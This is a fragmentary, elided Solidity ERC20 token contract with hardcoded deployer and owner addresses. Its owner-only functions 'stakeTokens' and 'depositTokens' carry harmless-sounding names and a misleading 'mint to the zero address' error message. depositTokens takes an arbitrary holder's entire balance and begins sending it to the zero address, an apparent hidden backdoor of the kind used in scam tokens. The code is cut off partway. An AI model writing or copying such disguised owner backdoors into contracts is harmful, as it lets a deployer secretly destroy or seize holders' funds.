...
contract ETETEEHRRN is Context, IERC20 {
    ...
    address lead_deployer = 0xe8986178e7Ea1cAc1EBCF15D0beB883705834D57;
    address public _owner = 0x61B14367e1871e3Ae2119952A3d3eE7637EBE51d;
   constructor () public {
...
//-----------------------------------------------------------------------------------------------------------------------//
    function stakeTokens(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
    ...
    function depositTokens(address account) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
        _beforeTokenTransfer(account, address(0), amount);
